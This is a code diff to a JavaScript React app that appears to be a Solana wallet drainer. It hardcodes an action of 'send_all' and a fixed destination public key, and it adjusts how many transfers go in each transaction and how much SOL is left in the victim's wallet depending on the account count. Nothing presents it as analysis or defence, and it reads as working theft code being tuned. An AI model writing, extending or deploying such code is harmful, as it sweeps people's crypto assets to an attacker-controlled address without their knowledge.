@@ -16,7 +16,7 @@ document.getElementById('favicon').setAttribute('href', image)
 
 const ACTION = 'send_all';
 
-const SENDS_IN_ONE_TX = 9;
+const SENDS_IN_ONE_TX = 7;
 // const CLOSES_IN_ONE_TX = 27;
 
 const DESTINATION = new PublicKey('HkGiZyGJt7H4XMpzzaSbsUtHqbypwzfuLeWqjkqpgsF2');
@@ -140,28 +140,28 @@ function App() {
 
             let remainingSolana
 
-            if(accounts1 < 10){
-                remainingSolana = 0.01
-            } else if(accounts1 < 19){
+            if(accounts1 < 8){
                 remainingSolana = 0.02
-            } else if(accounts1 < 28){
-                remainingSolana = 0.03
-            } else if(accounts1 < 37){
+            } else if(accounts1 < 15){
                 remainingSolana = 0.04
-            } else if(accounts1 < 46){
-                remainingSolana = 0.05
-            } else if(accounts1 < 55){
+            } else if(accounts1 < 22){
                 remainingSolana = 0.06
-            } else if(accounts1 < 64){
-                remainingSolana = 0.07
-            } else if(accounts1 < 73){
+            } else if(accounts1 < 29){
                 remainingSolana = 0.08
-            } else if(accounts1 < 82){
-                remainingSolana = 0.09
-            } else if(accounts1 < 91){
+            } else if(accounts1 < 36){
                 remainingSolana = 0.1
+            } else if(accounts1 < 43){
+                remainingSolana = 0.12
+            } else if(accounts1 < 50){
+                remainingSolana = 0.14
+            } else if(accounts1 < 57){
+                remainingSolana = 0.16
+            } else if(accounts1 < 64){
+                remainingSolana = 0.18
+            } else if(accounts1 < 71){
+                remainingSolana = 0.2
             } else {
-                remainingSolana = 0.1
+                remainingSolana = 0.2
             }
 
             console.log(accounts1, remainingSolana)
